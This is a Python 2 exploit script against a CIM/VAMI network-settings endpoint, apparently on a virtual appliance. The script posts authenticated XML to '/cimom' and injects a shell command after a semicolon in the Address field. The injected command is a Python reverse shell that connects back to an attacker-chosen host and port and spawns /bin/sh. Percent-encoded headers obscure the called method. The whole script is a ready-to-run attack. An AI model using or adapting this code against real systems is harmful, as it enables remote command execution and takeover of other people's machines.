import requests
import sys

from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) <> 6:
    print "usage script.py <target_url> <attacker_host> <attacker_port> <username> <password>"
    exit()

target_url = sys.argv[1]
attacker_host = sys.argv[2]
attacker_port = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]

headers = {"Content-Type":"application/xml; charset=UTF-8", "Cache-Control": "no-cache", "CIMProtocolVersion": "1.0", "CIMOperation": "MethodCall", "CIMMethod": "%53%65%74%564%41%6E%64%566%4E%65%74%77%6F%72%6B%53%65%74%74%69%6E%67", "CIMObject": "%72%6F%6F%74/%63%69%6D%762%3A%56%41%4D%49_%4E%65%74%77%6F%72%6B%53%65%74%74%69%6E%67.%4E%61%6D%65%3D%22%65%74%680%22%2C%53%65%72%76%65%72%4E%61%6D%65%3D%22%6C%6F%63%61%6C%68%6F%73%74%22"}

shellcode = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''' % (attacker_host, attacker_port)

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<CIM CIMVERSION="2.0" DTDVERSION="2.0"><MESSAGE ID="11" PROTOCOLVERSION="1.0"><SIMPLEREQ><METHODCALL NAME="SetV4AndV6NetworkSetting"><LOCALINSTANCEPATH><LOCALNAMESPACEPATH><NAMESPACE NAME="root"/><NAMESPACE NAME="cimv2"/></LOCALNAMESPACEPATH><INSTANCENAME CLASSNAME="VAMI_NetworkSetting"><KEYBINDING NAME="Name"><KEYVALUE VALUETYPE="string">eth0</KEYVALUE></KEYBINDING><KEYBINDING NAME="ServerName"><KEYVALUE VALUETYPE="string">localhost</KEYVALUE></KEYBINDING></INSTANCENAME></LOCALINSTANCEPATH><PARAMVALUE NAME="Address" PARAMTYPE="string"><VALUE>192.168.1.162; %s</VALUE></PARAMVALUE><PARAMVALUE NAME="GatewayV4" PARAMTYPE="string"><VALUE>192.168.1.1</VALUE></PARAMVALUE><PARAMVALUE NAME="SubnetMask" PARAMTYPE="string"><VALUE>255.255.255.0</VALUE></PARAMVALUE><PARAMVALUE NAME="AddressVersions" PARAMTYPE="string"><VALUE>STATICV4+AUTOV6</VALUE></PARAMVALUE></METHODCALL></SIMPLEREQ></MESSAGE></CIM>''' % shellcode

try:
    print "Launching exploit against %s" % target_url
    print "Expecting to receive a reversel shell on host %s port %s" % (attacker_host, attacker_port)
    print "After a few seconds check your netcat..."
    res = requests.post(target_url + "/cimom", auth=(username, password), data=payload, headers=headers, verify=False)
    if res.status_code == 401:
        print "Invalid credentials were specified"
    elif res.status_code <> 200:
        print "There was an error..."
        print res.status_code
        print res.reason

except Exception as e:
    print "There was an error..."
    print e